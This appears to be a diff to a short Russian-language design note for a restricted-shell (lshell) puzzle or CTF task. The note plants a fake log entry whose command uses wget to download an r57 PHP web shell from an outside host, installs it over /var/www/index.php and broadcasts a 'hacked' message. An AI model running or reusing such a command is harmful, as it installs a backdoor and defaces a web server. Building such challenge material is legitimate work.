@@ -1,5 +1,5 @@
 1. lshell как в лабиринте, но дать больше команд. (в том числе date)
     В домашней директории только один файл - лог
 2. В лог файл вставить строчку вида:
-YYYY-MM-DD HH:mm:ss,nnn (username):       CMD: "wget http://r57.gen.tr/shell/r57.rar && unrar x r57.rar && mv r57.php /var/www/index.php && curl localhost && echo \"U r H@xorEd\" | wall"
+YYYY-MM-DD HH:mm:ss,nnn (acid_burn):       CMD: "wget http://r57.gen.tr/shell/r57.rar && unrar x r57.rar && mv r57.php /var/www/index.php && w3m localhost && echo \"U r H@xorEd\" | wall"
 3. ProfIt
